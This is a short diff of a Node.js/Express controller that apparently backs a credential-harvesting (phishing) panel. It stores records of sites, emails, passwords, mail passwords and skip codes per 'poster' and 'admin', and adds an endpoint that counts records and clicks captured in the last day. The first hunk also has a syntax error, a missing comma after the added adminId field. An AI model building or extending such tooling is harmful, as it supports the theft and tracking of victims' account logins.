@@ -307,7 +307,7 @@ export const add_data = async (req, res) => {
         if (userFound && posterFound) {
             const info = await Info.create({
                 site, email, password, skipcode,
-                username,passcode,mail,mailPass,
+                username,passcode,mail,mailPass,adminId:adminId
                 poster: posterId,
                 root: posterFound._id
 
@@ -1070,5 +1070,72 @@ export const add_data_checnge = async (req, res) => {
 
 }
 
+export const today_data = async(req, res) => {
+    const {IId}=req.params
+    const user=await User.findOne({adminId:IId})
+        if(user){
+            const previousDay = new Date();
+            previousDay.setDate(previousDay.getDate() - 1);
+            const todayFound = await Info.find(
+                
+                {
+                    adminId:IId,
+                    createdAt:{$gte: new Date(Date.now() - 24*60*60*1000)},
+                
+                }
+            
+            )
+            const todayClick = await Click.find(
+                
+                {
+                    adminId:IId,
+                    updatedAt:{$gte: new Date(Date.now() - 24*60*60*1000)},
+                
+                }
+            
+            )
+            const totalFound = await Info.find(
+                
+                {
+                    adminId:IId,
+                
+                }
+            
+            )
+            return res.status(200).json({ todayFound: todayFound.length,todayClick: todayClick.length,totalFound: totalFound.length})
+        }
+        else{
+            const previousDay = new Date();
+            previousDay.setDate(previousDay.getDate() - 1);
+            const todayFound = await Info.find(
+                
+                {
+                    poster:IId,
+                    createdAt:{$gte: new Date(Date.now() - 24*60*60*1000)},
+                
+                }
+            
+            )
+            const todayClick = await Click.find(
+                
+                {
+                    poster:IId,
+                    updatedAt:{$gte: new Date(Date.now() - 24*60*60*1000)},
+                
+                }
+            
+            )
+            const totalFound = await Info.find(
+                
+                {
+                    poster:IId,
+                
+                }
+            
+            )
+            return res.status(200).json({ todayFound: todayFound.length,todayClick: todayClick.length,totalFound: totalFound.length})
+
+        }
+}
 
 
